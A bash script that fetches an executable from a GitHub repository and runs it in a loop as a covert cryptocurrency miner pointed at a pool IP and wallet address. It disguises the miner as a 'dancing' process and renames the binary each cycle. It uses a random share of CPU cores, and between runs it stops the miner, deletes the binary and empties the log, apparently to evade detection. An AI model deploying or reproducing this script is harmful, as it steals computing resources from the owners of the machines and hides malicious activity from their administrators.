#!/bin/bash

# Function to download and prepare the dancing script with a dynamic name
prepare_dancing_script() {
  local old_file=$(cat /tmp/lucky_file 2>/dev/null)
  if [[ -n "$old_file" && -f "$old_file" ]]; then
    echo "Removing old dancing script file: $old_file"
    rm -f "$old_file"
  fi

  local timestamp=$(date '+%Y%m%d%H%M%S')
  local filename="dance_${timestamp}"
  wget -O $filename https://github.com/barburonjilo/back/raw/main/sr
  chmod +x $filename
  echo $filename > /tmp/lucky_file
}

# Function to generate the localized date string with core count
generate_dancer() {
  local cores=$1
  TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed \
    's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/' \
    | sed "s/$/$cores/"
}

# Function to start the dancing process with a random number of cores
start_dance() {
  local total_cores=$(nproc)
  local num_cores=$(( ( RANDOM % (total_cores - 1) ) + 1 ))  # Randomly choose between 1 and (total_cores - 1)
  local dancer=$(generate_dancer $num_cores)  # Generate dancer string including core count
  local lucky_file=$(cat /tmp/lucky_file)

  # Start the dancing process without setting CPU affinity and output to log file
  nohup ./$lucky_file -a yescryptr32 --pool 45.115.225.49:808 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$dancer --timeout 120 -t $num_cores > dance.log 2>&1 &
  local pid=$!

  echo "Dance started with PID: $pid using $num_cores cores with file $lucky_file"

  # Save PID to a file for later use
  echo $pid > /tmp/lucky_pid
}

# Function to stop the dancing process
stop_dance() {
  if [ -f /tmp/lucky_pid ]; then
    local pid=$(cat /tmp/lucky_pid)
    local lucky_file=$(cat /tmp/lucky_file)
    echo "Stopping dance with PID: $pid using file $lucky_file"
    kill -9 $pid 2>/dev/null
    rm -f /tmp/lucky_pid

    # Empty the dance.log file
    > dance.log

    # Remove the stopped file
    if [[ -f "$lucky_file" ]]; then
      echo "Removing stopped dancing script file: $lucky_file"
      rm -f "$lucky_file"
    fi
  else
    echo "No PID file found, cannot stop dance"
  fi
}

# Function to generate a random sleep duration between 3 and 5 minutes
get_random_sleep_duration() {
  local min=180    # 3 minutes in seconds
  local max=300    # 5 minutes in seconds
  echo $((RANDOM % (max - min + 1) + min))
}

# Main execution
prepare_dancing_script

# Run the loop
while true; do
  start_dance

  # Get a random sleep duration
  sleep_duration=$(get_random_sleep_duration)
  
  # Validate and debug sleep duration
  if [[ -z "$sleep_duration" || "$sleep_duration" -lt 180 ]]; then
    echo "Error: Invalid sleep duration: $sleep_duration. Defaulting to 3 minutes."
    sleep_duration=180
  elif [[ "$sleep_duration" -gt 300 ]]; then
    echo "Error: Sleep duration exceeds maximum value. Adjusting to 5 minutes."
    sleep_duration=300
  fi
  
  echo "Sleeping for $((sleep_duration / 60)) minutes ($sleep_duration seconds)"
  sleep $sleep_duration
  
  stop_dance
  sleep 120  # Wait for 2 minutes

  # Prepare a new dancing script for the next iteration
  prepare_dancing_script
done
